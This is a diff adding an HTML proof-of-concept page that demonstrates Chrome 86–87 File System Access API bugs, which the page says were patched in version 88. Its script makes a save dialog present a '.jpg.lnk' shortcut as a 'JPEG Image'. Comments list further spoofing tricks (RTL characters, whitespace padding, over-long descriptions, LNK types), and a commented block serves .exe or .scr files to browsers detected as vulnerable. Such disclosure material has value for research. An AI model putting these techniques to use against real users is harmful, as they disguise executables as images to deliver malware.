@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>File System Access API - security bugs</title>
+</head>
+
+<body>
+    <h3>File System Access API - security bugs</h3>
+
+    <img style="border: 2px solid grey" src="cat.jpg" alt="awesome cat" width="453" height="604">
+    <div>
+        <button id="addNewFile" style="font-size: 26px; margin-top: 10px;">Save LNK file and show save as type
+            "JPEG Image (*.jpg)"</button>
+    </div>
+
+    <script>
+        // The bugs works in Google Chrome 86 and 87. They are patched in 88+.
+        // Save LNK file and show save as type: JPEG Image (*.jpg)
+        // before patch: Save as type: "JPEG Image (*.jpg)" and saved file was .lnk
+        // after patch: Save as type: "JPEG Image (.jpg) (*.txt, *.text)" and saved file is changed to .txt [ok!]
+        const butSaveNewFile = document.getElementById('addNewFile')
+        butSaveNewFile.addEventListener('mouseup', async () => {
+            const options = {
+                types: [
+                    {
+                        description:
+                            'JPEG Image (*.jpg)',
+                        accept: {
+                            'text/plain': ['.jpg.lnk'] //could be .exe/.bat or anything
+                        }
+                    }
+                ],
+                //delete from Save as type "*.*" option
+                excludeAcceptAllOption: true
+            }
+
+            const handle = await window.showSaveFilePicker(options)
+            const writable = await handle.createWritable()
+
+            // 1) download file from local/server (Good for exe/lnk)
+            //you need to have FUD file lnkextra.lnk on server/local
+            //can be changed to diffrent file like cat.jpg
+            // const response = await fetch('lnkextra.lnk');
+            // await response.body.pipeTo(writable);
+
+            // 2) write text to download file (Good for bat)
+            //instead of downloading file we can write text to file
+            await writable.write('C:\\Windows\\system32\\calc.exe')
+            await writable.close()
+        })
+
+        //Other examples you need to swap "types" section :) 
+
+        // A many of whitespace and fake extensions in the description
+        // before patch: Save as type: "JPEG Image (*.jpg)" descritpion too long real extension was hidden
+        // after patch: Save as type: "JPEG Image (.jpg) limits on description length
+        //
+        // types: [
+        //     {
+        //       description:
+        //         "JPEG Image (*.jpeg) \n\n\t\t\t\t\t\t\n\n\n                                                                                                                                                                                                                                                                                                                                            ",
+        //       accept: {
+        //         "text/plain": [".bat"]
+        //       }
+        //     }
+        //   ]
+
+        // RTL in description
+        // before patch: Manipulation with RTL character 
+        // after patch: RTL character is still working but we can't manipulate to delete extension 
+        //
+        //   types: [
+        //     {
+        //       description: "Foo \u202egepj\u202e.moc.segami.www.exe Ardd",
+        //       accept: {
+        //         "text/plain": [".bat"]
+        //       }
+        //     }
+        //   ]
+
+        // Super long description
+        // before patch: Description is too long so real extensions are hidden
+        // after patch:  limits on description length
+        //
+        //   types: [
+        //     {
+        //       description: "JPEG Image (*.jpeg) this is super safe image, because it is a cat, and cats are cool there is nothing to worry about this must do exactly what you think it does, so you can download it and be happy",
+        //       accept: {
+        //         "text/plain": [".bat"]
+        //       }
+        //     }
+        //   ]
+
+        // Many spaces in the extension
+        // before patch: Extra manipulation of file name by extension field
+        // after patch:  extension filed has limited lenght
+        //
+        //   types: [
+        //     {
+        //       description: "JPEG Image",
+        //       accept: {
+        //         "text/plain": [
+        //           ".jpg                                                                                                                     .bat"
+        //         ]
+        //       }
+        //     }
+        //   ]
+
+        // RTL in extension
+        // before patch: Manipulation with RTL character 
+        // after patch: RTL character is blocked
+        //
+        //   types: [
+        //     {
+        //       description: "JPEG Image (*.jpeg)",
+        //       accept: {
+        //         "text/plain": [".\u202egepj\u202e.moc.segami.www.exe"]
+        //       }
+        //     }
+        //   ]
+
+        // Extension ends with space (source: https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file)
+        // before patch: File is downloaded and hard to deleted on windows (Possible that it wasnt always working)
+        // after patch: Extension cannot have space at the end
+        //
+        //   types: [
+        //     {
+        //       description: "JPEG Image",
+        //       accept: {
+        //         "text/plain": [".jpeg  "]
+        //       }
+        //     }
+        //   ]
+
+        // Extension ends with period (source: https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file)
+        // before patch: File is downloaded and hard to deleted on windows (Possible that it wasnt always working) - not sure
+        // after patch: Extension cannot have space at the end
+        //   types: [
+        //     {
+        //       description: "JPEG Image",
+        //       accept: {
+        //         "text/plain": [".jpeg."]
+        //       }
+        //     }
+        //   ]
+
+        // lnk file
+        // before patch: possible to download LNK - windows shortcut file
+        // after patch: LNK files are blocked
+        //   types: [
+        //     {
+        //       description: "JPEG Image (*.jpg)",
+        //       accept: {
+        //         "application/x-ms-shortcut": []
+        //       }
+        //     }
+        //   ]
+
+
+
+        // EXTRA - Because everything happens in JS we can check if user's browser is vulnerable
+        //var userAgentA = navigator.userAgent;
+        //var description = 'JPEG (*.jpeg)'
+        //var extension = '.jpeg'
+        //var file = "someRealPhotoFile.jpeg"
+        //Exploit works on this client - windows 10 - change to dangerous .exe file
+        // if (userAgentA.includes("Windows NT 10.0") && userAgentA.includes("Chrome/86.0.4240.75")) {
+        //     var extension = '.exe'
+        //     var file = "putty.exe"
+        // }
+        //Exploit works on this client - windows 7 - change to dangerous .src (screen saver) files (windows 10 stopped running .src files due to security issue)
+        // But .src looking more legin than .exe - so it is better
+        // else if (userAgentA.includes("Windows NT 6.1") && userAgentA.includes("Chrome/86.0.4240.75")) {
+        //     var extension = '.src'
+        //     var file = "putty.exe"
+        // }
+        //
+    </script>
+
+</body>
+
+</html>
